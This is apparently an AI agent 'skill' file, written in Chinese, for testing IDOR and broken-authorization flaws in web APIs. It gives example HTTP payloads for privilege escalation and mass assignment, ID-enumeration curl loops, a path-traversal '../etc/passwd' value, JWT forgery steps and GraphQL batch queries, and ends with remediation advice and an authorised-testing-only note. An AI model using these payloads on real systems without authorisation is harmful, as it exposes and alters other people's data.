---
name: idor-testing
description: IDOR不安全直接对象引用深度测试技能：水平越权/垂直越权/BOLA/BFLA、参数篡改、对象ID枚举、GraphQL IDOR、批量分配
version: 2.0.0
---

# IDOR越权访问深度测试技能

## 概述

IDOR（Insecure Direct Object Reference）是最常见的业务逻辑漏洞类型，攻击者通过修改引用对象的参数（如ID/文件名/订单号）访问或修改其他用户数据。现代防护采用对象级授权检查、UUID代替自增ID、所有权校验。本技能覆盖水平越权（BOLA）、功能级越权（BFLA）、参数篡改、ID枚举、静态文件越权、GraphQL IDOR、批量分配等全场景。

## 一、IDOR完整攻击面

### 1.1 对象引用类型
| 引用类型 | 示例 | 测试方法 |
|---------|------|---------|
| 自增ID | `?user_id=123`、`/order/456` | 遍历ID递增/递减 |
| UUID/GUID | `?id=a1b2c3d4-...` | 枚举已有UUID（需泄露源）|
| 文件名 | `?file=report.pdf` | 路径遍历+枚举文件名 |
| 邮箱/手机号 | `?email=user@x.com` | 遍历/爆破邮箱 |
| 用户名 | `/profile/admin` | 用户名枚举 |
| 订单号/流水号 | `?order=202401010001` | 订单号规则猜测 |
| Hash ID | `?id=abc123xyz` | Hashids解码或碰撞 |
| Base64编码ID | `?id=MTIz` | 解码后修改再编码 |
| JWT Token中的ID | Token内含user_id | 修改JWT payload（需密钥/None算法）|
| 路径参数 | `/users/123/orders/456` | 修改路径段 |
| POST Body JSON | `{"user_id":123}` | 修改JSON字段 |
| HTTP Header | `X-User-Id: 123` | 修改Header |
| Cookie字段 | Cookie中含user_id | 修改Cookie |
| 隐藏表单字段 | `<input type=hidden name=id value=123>` | 修改隐藏字段 |

### 1.2 IDOR类型
- **水平越权（BOLA - Broken Object Level Authorization）**：访问同角色其他用户数据
- **垂直越权（BFLA - Broken Function Level Authorization）**：低权限用户访问高权限功能
- **对象属性越权**：修改不应修改的字段（如role=admin）
- **静态文件越权**：直接访问他人的上传文件/导出文件
- **ID枚举**：可遍历ID获取所有用户数据（数据泄露）
- **参数污染越权**：同时传user_id=1&user_id=2，后端取错误值
- **批量分配（Mass Assignment）**：添加额外字段如is_admin=1创建管理员
- **GraphQL IDOR**：GraphQL接口未做对象级授权

## 二、检测方法

### 2.1 参数识别
```
1. 拦截所有请求，标记包含对象ID的参数
2. 常见ID参数名：id, uid, user_id, account_id, order_id, file_id, doc_id,
   report_id, message_id, ticket_id, customer_id, product_id, invoice_id,
   payment_id, transaction_id, profile_id, photo_id, comment_id, post_id
3. 记录两个不同用户A和B的相同操作请求
4. 替换A请求中的对象ID为B的ID，重放
```

### 2.2 水平越权测试
```http
# 用户A访问自己的订单
GET /api/orders/1001 HTTP/1.1     （用户A的订单，正常）
Cookie: session=user_a_session

# 替换为用户B的订单ID
GET /api/orders/1002 HTTP/1.1     （应返回403/404）
Cookie: session=user_a_session

# POST修改数据
POST /api/orders/1002/cancel HTTP/1.1
Cookie: session=user_a_session

# JSON API
POST /api/user/profile HTTP/1.1
Cookie: session=user_a_session
{"user_id": 2, "email": "attacker@evil.com"}   （修改user_id为其他用户）
```

### 2.3 垂直越权测试
```http
# 普通用户访问管理员接口
GET /admin/users HTTP/1.1          （应403）
Cookie: session=normal_user

# 普通用户访问用户管理
GET /api/admin/delete_user?id=1 HTTP/1.1
Cookie: session=normal_user

# 普通用户尝试提权
POST /api/user/update HTTP/1.1
Cookie: session=normal_user
{"role":"admin","is_admin":true}   （添加/修改角色字段）

# 仅前端隐藏但后端不校验
POST /api/users/create HTTP/1.1    （管理员创建用户功能，普通用户直连）
Cookie: session=normal_user
{"username":"hacker","password":"x","role":"superadmin"}
```

### 2.4 ID枚举测试
```
# 自增ID遍历
for i in {1..1000}; do curl -s -o /dev/null -w "%{http_code}" "https://target.com/api/user/$i"; done

# 检测是否返回不同状态码/内容长度
# 200/301+内容→ID存在
# 403→ID存在但无权限
# 404→ID不存在
# 302→存在但需要认证
```

### 2.5 静态文件越权
```
# 上传文件/导出文件直接访问
/files/avatar/user_123.jpg    → 修改为/files/avatar/user_456.jpg
/download?file=report_a.pdf   → 修改为/download?file=report_b.pdf
/export/invoice_1001.pdf      → 修改invoice ID
/storage/photos/2024/01/abc.jpg  → 路径遍历枚举
/files?path=/user1/data.csv   → path参数篡改

# 测试云存储URL
https://bucket.oss-cn-hangzhou.aliyuncs.com/user123/file.jpg
修改user123为其他用户目录

# 测试签名URL有效期/权限
```

### 2.6 编码/加密ID绕过
```php
// Base64编码ID
?id=MTIz → Base64解码=123 → 修改为124 → 编码为MTI0 → 发送
?id=MTI0

// JWT中的ID
// eyJ... → 解码修改user_id → 若alg=none或密钥泄露则伪造
// 使用jwt_tool测试

// Hashids（数字ID的可逆哈希）
// https://hashids.org/ 可解码/猜测salt
// id=abc123 → 尝试解码 → 修改ID → 重新编码

// 序列化对象
// Java PHP Python序列化对象中的ID字段，需反序列化修改
```

## 三、绕过技术

### 3.1 多参数/参数污染
```http
# 同名多参数（HPP）
GET /api/user?user_id=1&user_id=2
# 某些框架取第一个，某些取最后一个，某些拼接为数组

# 参数名大小写/变体
?userId=2&userid=2&USER_ID=2&User_id=2&uid=2

# 路径参数变体
/api/user/profile?id=1
/api/user/1/profile    → RESTful路径中的ID
/api/user?id=1         → 查询参数
/api/user;id=1         → 路径参数（;变体）

# JSON数组
{"user_id": [1,2]}     → 后端取1或2？
{"id":"1,2"}           → 逗号分隔
```

### 3.2 HTTP方法覆盖
```http
# 管理员接口可能限制方法但覆盖方法绕过
GET /api/admin/users HTTP/1.1       → 403
POST /api/admin/users HTTP/1.1      → ？
PUT /api/admin/users HTTP/1.1       → ？
PATCH /api/admin/users HTTP/1.1     → ？
HEAD /api/admin/users HTTP/1.1      → ？
OPTIONS /api/admin/users HTTP/1.1   → 查看允许的方法

# _method覆盖
POST /api/user/123 HTTP/1.1
X-HTTP-Method-Override: PUT
_method=DELETE
```

### 3.3 Content-Type变换
```http
# JSON vs form data
Content-Type: application/json → {"id":2}
Content-Type: application/x-www-form-urlencoded → id=2
Content-Type: application/xml → <id>2</id>
Content-Type: multipart/form-data → form字段id=2
# 某些后端对不同Content-Type的授权检查不一致
```

### 3.4 路径/URL绕过
```http
/api/users/123      → 正常路径
/api/users/123/     → 尾斜杠
/api/users/./123    → 点号
/api/users//123     → 双斜杠
/api/./users/123    → 路径归一化
/api/users/123%00  → 空字节
/api/users/123.json → 扩展名
/api/users/123;x=y  → 矩阵参数
/api/v1/users/123   → v1/v2版本绕过权限检查
/api/v2/users/123
```

### 3.5 Referer/Origin绕过
```http
# 某些应用仅检查Referer/Origin是否为管理后台页面
# 添加Referer绕过：
Referer: https://target.com/admin/
Origin: https://target.com
X-Requested-With: XMLHttpRequest
```

### 3.6 批量分配（Mass Assignment）
```http
# 创建用户时添加额外字段
POST /api/users HTTP/1.1
{"username":"hacker","password":"P@ss","email":"h@x.com","is_admin":true,"role":"admin","is_staff":true}

# 更新自己的资料时修改角色
PUT /api/user/profile HTTP/1.1
{"name":"test","email":"test@x.com","role":"admin","permissions":"all"}

# 添加不在文档中的字段（框架自动绑定）
POST /api/register HTTP/1.1
{"username":"hacker","password":"P@ss","is_verified":true,"balance":999999}
```

### 3.7 搜索/接口功能越权
```http
# 搜索接口可能返回所有用户数据
GET /api/search?q=&limit=10000       → 全量数据
GET /api/export?type=all&user_id=*   → 导出接口
GET /api/users?filter[role]=admin    → 过滤参数

# GraphQL introspection + IDOR
POST /graphql
{"query":"{allUsers{id,email,passwordHash,role}}"}
```

### 3.8 竞态条件越权
```python
import threading
import requests

# 同时发送A用户和B用户的请求，可能在权限检查前替换上下文
def req_user(user_cookie, target_id):
    r = requests.get(f'https://target.com/api/orders/{target_id}',
                     cookies={'session': user_cookie})
    print(r.text)

# 竞态场景：支付时修改订单号为他人订单
# 密码重置token竞态
```

## 四、API特定IDOR

### 4.1 REST API测试
```
GET    /api/users/{id}        查看用户
PUT    /api/users/{id}        更新用户
DELETE /api/users/{id}        删除用户
PATCH  /api/users/{id}        部分更新
GET    /api/users/{id}/orders 用户订单
POST   /api/users/{id}/transfer 转账
每个端点都需测试替换{id}为其他用户ID
```

### 4.2 GraphQL IDOR/BOLA
```graphql
# Introspection查询所有可用字段
{__schema{types{name,fields{name,args{name,type{name}}}}}}

# 批量查询其他用户数据
query {
  user(id: 1) { email }
  user(id: 2) { email }
  user(id: 3) { email }
}

# 节点接口（Node interface）批量查询
{
  node(id: "VXNlcjox") { ... on User { email } }
  node(id: "VXNlcjoy") { ... on User { email } }
}

# 未做字段级权限控制
mutation {
  updateUser(id:2, role:"admin") { id role }
}

# GraphQL批量请求（别名绕过速率限制）
query { a:user(id:1){email} b:user(id:2){email} c:user(id:3){email} ... }
```

### 4.3 gRPC/Protobuf IDOR
- 反编译.proto文件，查看服务定义
- 修改请求中的ID字段
- 反射服务测试：`grpcurl -plaintext target:443 list`
- Metadata中用户身份字段可篡改

### 4.4 JSON API批量操作
```json
POST /api/batch
{
  "operations": [
    {"method":"GET","path":"/users/1"},
    {"method":"GET","path":"/users/2"},
    {"method":"DELETE","path":"/users/3"}
  ]
}
```

## 五、特殊场景

### 5.1 文件下载/导出IDOR
```
?file=../../../etc/passwd                (路径穿越)
?file=user_123/../../admin/config.php   (穿越)
?file=report_2024_01.pdf               (修改日期/ID枚举)
/download?id=1&token=xxx               (token是否绑定用户)
/avatar/123.jpg                        (用户头像ID枚举)
/export/invoice/INV-2024-0001.pdf      (发票号顺序枚举)
```

### 5.2 重置密码/验证码IDOR
```
# 密码重置token是否绑定用户
POST /reset-password?token=xxx&new_password=yyy
# 若token有效但不验证是哪个用户的token，可用自己的token重置他人密码

# 验证码轰炸+枚举
POST /verify-code {"phone":"13800138000","code":"123456"}
# 验证码长度过短（4位）可枚举
```

### 5.3 WebSocket IDOR
```javascript
// WS连接后订阅其他用户频道
ws.send(JSON.stringify({type:"subscribe", channel:"user_2_messages"}));
ws.send(JSON.stringify({type:"get_history", user_id:2}));
```

### 5.4 移动端API IDOR
```
- 抓包移动端API，修改user_id/device_id
- 注意API可能基于device token认证，替换token
- 反编译APK查看API端点
```

### 5.5 JWT/Token ID篡改
```
1. alg=none攻击：header中alg改为none，payload中user_id改为目标用户
2. 弱密钥爆破：使用jwt_tool/john爆破HS256密钥
3. RS256→HS256：公钥作为HMAC密钥
4. 嵌入其他用户的JWT
5. 修改kid/x5u/jku等头部字段
```

## 六、自动化工具

| 工具 | 用途 |
|------|------|
| Autorize (Burp插件) | 自动IDOR检测（低权限Cookie重放请求）|
| AuthMatrix (Burp插件) | 角色权限矩阵测试 |
| AutoRepeater (Burp插件) | 自动替换参数重放 |
| Burp Bounty | 自动化扫描规则 |
| GraphQL Voyager/InQL | GraphQL探索与IDOR测试 |
| JWT_Tool | JWT测试与篡改 |
| ffuf/wfuzz | ID枚举fuzz |
| Arjun | 参数发现（隐藏ID字段）|

### 6.1 Autorize使用
```
1. 配置低权限用户Cookie
2. 使用高权限用户正常浏览
3. Autorize自动以低权限Cookie重放请求
4. 检查响应差异（状态码、长度）
5. 200/内容有差异=可能IDOR
6. 403/401=有授权
7. 404=对象不存在
```

### 6.2 AuthMatrix使用
```
1. 配置多个用户Cookie（admin/user1/user2/unauth）
2. 定义角色和请求表
3. 自动检测垂直/水平越权
```

## 七、IDOR测试清单

- [ ] 所有带ID的参数（GET/POST/JSON/路径/Header/Cookie）
- [ ] 水平越权（同角色访问其他用户数据）
- [ ] 垂直越权（普通用户访问管理员功能）
- [ ] ID枚举（自增ID/UUID泄露/订单号）
- [ ] Base64/Hash/JWT等编码ID解码篡改
- [ ] 静态文件/下载链接越权
- [ ] 批量分配（额外字段role/is_admin/balance）
- [ ] 搜索/导出/批量接口全量数据泄露
- [ ] GraphQL introspection+节点查询
- [ ] REST方法覆盖（GET/POST/PUT/DELETE/PATCH）
- [ ] 参数污染/HPP（多参数名/大小写变体）
- [ ] Content-Type变换（JSON→form→xml）
- [ ] 路径归一化绕过（尾斜杠/双斜杠/./;x=）
- [ ] Referer/Origin绕过
- [ ] WebSocket频道订阅
- [ ] API版本切换（v1/v2）
- [ ] 密码重置/验证码越权
- [ ] 文件上传后访问越权
- [ ] 竞态条件场景
- [ ] 支付/订单流程（订单ID篡改）
- [ ] JWT Token篡改（alg=none/弱密钥/RS256→HS256）
- [ ] HTTP头注入用户ID（X-User-ID/X-Forwarded-User）

## 八、修复建议

- **对象级授权检查**：每次访问对象时验证所有权（user_id == session.user_id）
- **功能级授权检查**：基于角色(RBAC)或属性(ABAC)的访问控制
- **使用不可预测ID**：UUID/ULID代替自增ID，防止枚举
- **服务端校验**：不信任客户端传入的user_id/role等权限字段
- **避免批量分配**：使用DTO/白名单字段，框架禁用auto-bind
- **统一授权中间件**：在中间件/拦截器层面做权限验证，而非业务代码
- **最小权限原则**：API只返回必要字段
- **速率限制**：防止ID枚举和批量爬取
- **访问日志/监控**：异常ID访问告警（如频繁访问非自己的资源）
- **文件存储隔离**：文件URL加签名（Signed URL），绑定用户和过期时间
- **Token绑定**：密码重置token等绑定到具体用户

## 注意事项

- **仅限授权测试**：访问其他用户数据属于敏感操作，必须在授权范围内测试
- **数据脱敏**：发现IDOR漏洞时不要下载/泄露真实用户数据
- **影响评估**：评估可访问数据的敏感程度（个人信息/财务/医疗等）
- **枚举风险**：自增ID可批量爬取所有用户数据，影响严重
- **合规要求**：遵守《网络安全法》《数据安全法》《个人信息保护法》，仅在授权范围内测试
